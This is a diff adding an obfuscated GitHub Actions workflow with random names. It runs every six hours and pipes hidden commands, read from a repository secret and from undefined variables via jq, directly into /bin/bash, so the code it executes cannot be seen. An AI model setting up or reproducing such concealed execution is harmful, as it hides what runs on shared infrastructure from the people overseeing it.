@@ -1,0 +1,30 @@
+name: zhengcunzai3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhengcunzai3456
+        env:
+          m3312: ${{ secrets.m3312 }}
+        run: |
+          echo $m3312 | jq -r .dow5983 | /bin/bash
+          echo $ht4 | jq -r .glxdp20320 | /bin/bash
+          echo $pus797 | jq -r .qrtc9154 | /bin/bash
+          echo $z09396 | jq -r .reph613 | /bin/bash
+          echo $fmza9 | jq -r .vqlm21 | /bin/bash
+          echo $juf0511 | jq -r .ko591 | /bin/bash
+          echo $cfahh52629 | jq -r .e65506 | /bin/bash
+          echo $xjmg50912 | jq -r .tkdi16260 | /bin/bash
+          echo $rv3596 | jq -r .vb133 | /bin/bash
+          echo $e93064 | jq -r .fpd6990 | /bin/bash
+          echo $yup395 | jq -r .n90453 | /bin/bash
+          echo $xihlx4675 | jq -r .r79 | /bin/bash
+
